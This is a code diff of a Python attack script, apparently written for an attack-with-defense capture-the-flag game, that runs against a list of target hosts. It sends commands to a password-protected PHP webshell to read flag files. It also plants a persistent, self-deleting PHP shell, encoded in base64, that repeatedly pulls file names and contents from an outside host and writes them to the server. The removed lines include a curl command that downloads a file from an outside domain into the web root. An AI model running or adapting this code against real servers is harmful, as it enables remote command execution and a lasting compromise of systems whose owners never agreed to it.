@@ -20,56 +20,55 @@ import re
 #         print(result)
 
 def getflag():  #获取flag并自动提交，通过webshell来获取flag
-    uri = "/"  #shell地址
+    uri = "/.user_config.php"  #shell地址
     header = {
 		"Content-Type": "application/x-www-form-urlencoded",
 		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
 	}
-    data = "gbk=system('cat /flag.txt');"
-    with open('targets.txt', 'a+') as f:
+    data = "pass=WJdhNWqs&cmd=system('cat /flag');"
+    #data = "cmd=system('cat /flag');"
+    with open('targets.txt', 'r') as f:
         targets = f.readlines()
         for target in targets:
             target = target.strip()
-            url = "http" + target + uri
+            url = "http://" + target + uri
             try:
-                res = requests.post(url, headers=header, data=data)
+                res = requests.post(url, headers=header, data=data,timeout=1)
+                #正则匹配flag
                 pattern = "flag\{.*\}"
                 z = re.search(pattern, res.text)
                 flag = z.group()
+                #flag = res.text.strip()
+                print(flag)
                 submit_flag(flag)
             except Exception as f:
-                print(url + "shell未上传成功\n")
+                print(f)
+                print(url + "\tshell未上传成功\n")
 
 
 def webshell():   #获取webshell
-    uri = "/user.php"
+    uri = "/.user_config.php"
     header = {
         "Content-Type": "application/x-www-form-urlencoded",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
         "Referer": ''''''
     }
-    with open('targets.txt', 'a+') as f:
+    poc = "echo -n 'PD9waHAgCglzZXRfdGltZV9saW1pdCgwKTsKCWVycm9yX3JlcG9ydGluZygwKTsKCXVubGluayhfX0ZJTEVfXyk7Cgl3aGlsZSgxKXsKCQlmaWxlX3B1dF9jb250ZW50cyhmaWxlX2dldF9jb250ZW50cygnaHR0cDovLzE5Mi4xNjguMS4zLzEudHh0JyksZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly8xOTIuMTY4LjEuMy8yLnR4dCcpKTsKCQkvL3VzbGVlcCg1MDAwKTsKCQlzbGVlcCgxKTsKCQkkZmlsZSA9ICcvdmFyL3d3dy9odG1sL2FwcGxpY2F0aW9uL2NvbW1vbi5waHAnOwoJCWlmKGZpbGVfZXhpc3RzKCRmaWxlKSl7CgkJCXVubGluaygkZmlsZSk7CgkJfQoJfQo/Pg==' |base64 -d >>//var/www/html/cc.php"
+    with open('targets.txt', 'r') as f:
         targets = f.readlines()
+
         for target in targets:
             target = target.strip()
+            #data = 'c=system("{}");'.format(poc)
             url = "http://" + target + uri
-            req1 = requests.get(url, headers=header)
-            data = "1337=system('curl -o /var/www/html/cc.php http://www.404vul.cn/die.txt');"
-            muma_url = "http://" + target + "/1.php"
-            res = requests.get(muma_url, headers=header, data=data)
+            print(url)
+            data = "pass=WJdhNWqs&cmd=system('{}');".format(poc)
+            res = requests.post(url, headers=header, data=data)
             url2 = "http://" + target + "/cc.php"
             try:
                 res2 = requests.get(url2, timeout=1)
+                if res2.status_code == 200:
+                    print('上传shell成功：' + url2)
             except Exception as e:
                 pass
 
-def submit_flag(flag):  #提交flag输出提交结果
-    submit_url = "http://awd.ctf.soonsec.cn:8089/ajax.php?m=flagSubmit"
-    header = {
-		"Content-Type": "application/x-www-form-urlencoded",
-		"token": ""
-	}
-    flag = flag.rstrip('\n')
-    data = "m=flagSubmit&flag={0}".format(flag)
-    r = requests.post(submit_url, headers=header, data=data)
-    print(r.text)
